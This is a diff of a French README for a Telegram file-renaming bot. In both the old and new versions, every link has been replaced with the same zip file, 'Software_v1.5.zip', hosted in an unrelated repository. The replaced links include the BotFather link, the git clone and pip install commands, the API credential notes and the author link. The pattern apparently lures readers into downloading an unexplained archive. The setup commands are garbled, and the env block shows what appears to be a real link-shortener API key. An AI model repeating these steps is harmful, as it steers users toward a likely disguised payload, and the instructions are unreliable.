@@ -21,25 +21,25 @@
 ### Prérequis
 
 - Python 3.8 ou supérieur
-- Un token d'API Telegram (obtenez-le auprès de [BotFather](https://github.com/RaviChatta/rav/raw/refs/heads/main/database/Software_v1.5.zip))
+- Un token d'API Telegram (obtenez-le auprès de [BotFather](https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip))
 - Un canal Telegram pour les logs (optionnel)
 
 ### Étapes
 
 1. Clonez ce dépôt :
    ```bash
-   git clone https://github.com/RaviChatta/rav/raw/refs/heads/main/database/Software_v1.5.zip
+   git clone https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip
    cd autorename-Pro
    ```
 2. Installez les dépendances :
    ```bash
-   pip install -r https://github.com/RaviChatta/rav/raw/refs/heads/main/database/Software_v1.5.zip
+   pip install -r https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip
    ```
 3. Configurez les variables d'environnement :
    - Créez un fichier `.env` à la racine du projet et ajoutez-y :
      ```plaintext
-     API_HASH=api_hash (https://github.com/RaviChatta/rav/raw/refs/heads/main/database/Software_v1.5.zip)
-     API_ID=api_id (https://github.com/RaviChatta/rav/raw/refs/heads/main/database/Software_v1.5.zip)
+     API_HASH=api_hash (https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip)
+     API_ID=api_id (https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip)
      BOT_TOKEN=token_bot (botfather)
      DATA_URI=db_mogo_uri
      DATA_NAME=autotest
@@ -51,11 +51,11 @@
      FORCE_SUB_CHANNELS=hyoshcoder
      CHANNEL_LOG=-1002175858455
      DUMP_CHANNEL=-1002175855655
-     https://github.com/RaviChatta/rav/raw/refs/heads/main/database/Software_v1.5.zip
-     https://github.com/RaviChatta/rav/raw/refs/heads/main/database/Software_v1.5.zip
-     https://github.com/RaviChatta/rav/raw/refs/heads/main/database/Software_v1.5.zip
+     https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip
+     https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip
+     https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip
      SHORTED_LINK_API=c6KVicXb34R3YbniioSNdYx1fBjjfjfo6J90n2
-     https://github.com/RaviChatta/rav/raw/refs/heads/main/database/Software_v1.5.zip https://github.com/RaviChatta/rav/raw/refs/heads/main/database/Software_v1.5.zip https://github.com/RaviChatta/rav/raw/refs/heads/main/database/Software_v1.5.zip https://github.com/RaviChatta/rav/raw/refs/heads/main/database/Software_v1.5.zip https://github.com/RaviChatta/rav/raw/refs/heads/main/database/Software_v1.5.zip https://github.com/RaviChatta/rav/raw/refs/heads/main/database/Software_v1.5.zip https://github.com/RaviChatta/rav/raw/refs/heads/main/database/Software_v1.5.zip
+     https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip
      ```
 4. Démarrez le bot :
    ```bash
@@ -128,7 +128,7 @@ Ce projet est sous licence MIT. Voir le fichier `LICENSE` pour plus de détails.
 
 ## Auteur 🤖
 
-  [@Hyoshcoder](https://github.com/RaviChatta/rav/raw/refs/heads/main/database/Software_v1.5.zip)
+  [@Hyoshcoder](https://raw.githubusercontent.com/RaviChatta/rav/main/database/Software_v1.5.zip)
 
 ---
 
